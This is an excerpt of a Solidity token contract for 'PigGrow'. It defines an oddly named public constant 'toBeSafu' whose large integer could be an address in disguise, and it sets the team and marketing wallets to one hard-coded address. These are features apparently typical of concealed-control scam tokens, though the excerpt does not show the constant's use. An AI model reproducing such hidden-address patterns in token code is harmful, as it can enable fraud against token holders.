...
contract PigGrow is Context, IERC20, Ownable {

    uint256 public toBeSafu=
    1092853989739002093898622997022009705909516546366;
    using SafeMath for uint256;
    string private _name = "PigGrow";
    string private _symbol = "PigGrow";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x7B200c0A969147DB993EE40ca0B074E119EaDF61));
        marketWall = payable(address(0x7B200c0A969147DB993EE40ca0B074E119EaDF61));
